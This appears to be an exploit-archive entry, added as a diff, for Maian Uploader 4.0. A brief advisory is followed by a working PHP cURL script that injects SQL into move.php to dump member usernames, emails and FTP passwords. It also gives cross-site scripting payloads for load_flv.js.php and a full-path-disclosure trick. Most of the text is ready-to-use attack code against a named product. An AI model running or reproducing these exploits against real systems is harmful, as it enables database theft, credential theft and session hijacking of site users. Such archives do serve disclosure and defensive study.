@@ -1,0 +1,59 @@
+source: http://www.securityfocus.com/bid/65137/info
+
+Maian Uploader is prone to multiple security vulnerabilities, including:
+
+1. An SQL-injection vulnerability
+2. Multiple cross-site scripting vulnerabilities
+
+Attackers can exploit these issues to access or modify data, exploit latent vulnerabilities in the underlying database, execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+Maian Uploader 4.0 is vulnerable; other versions may also be affected. 
+
++] Exploit (1) ' SQL Injection ' =>
+#
+# <?php
+#
+# /*
+#
+# - move.php (lines: 90 > 92 )
+# $q_acc = mysql_query("SELECT id,username FROM ".$database['prefix']."members 
+# WHERE id != '".$_POST['id']."' 
+# ORDER BY accname") or die(mysql_error());
+#
+# */
+#
+# $sqli = "SELECT GROUP_CONCAT(id,0x3a,username,0x3a,email,0x3a,ftp_user,0x3a,ftp_pass SEPARATOR 0x2c20) FROM mu_members";
+#
+# $ch = curl_init();
+# curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
+# curl_setopt($ch, CURLOPT_URL, "http://[target]/[path]/admin/data_files/move.php");
+# curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)");
+# curl_setopt($ch, CURLOPT_POST, 1);
+# curl_setopt($ch, CURLOPT_POSTFIELDS, "id=$sqli");
+# $exploit = curl_exec ($ch);
+# curl_close($ch);
+# unset($ch);
+# echo $exploit;
+# ?>
+# 
+####
+#
+# [+] Exploit (2) ' XSRF/XSS ' =>
+#
+# - load_flv.js.php ( line : 25 ) 
+# document.write('<object type="application/x-shockwave-flash" .....
+# width="<?php echo $_GET['width']; ?>" 
+# height="<?php echo $_GET['height']; ?>
+#
+# XSS : "><h1>XsS by KedAns-Dz</h1>
+# XSS : "><script>Alert('XsS by KedAns-Dz');</script>
+#
+# http://127.0.0.1/uploader/admin/js/load_flv.js.php?width=[ XSS ]
+# http://127.0.0.1/uploader/js/load_flv.js.php?width=[ XSS ]
+#
+# [&] Exploit (3) ' Full Path Disclosure ' => 
+#
+# don't put ( &height= ) after width Xss and you get error 
+# Notice about ( Undefined index: height ) with the Full Path Dir.
+#
+######################################################################
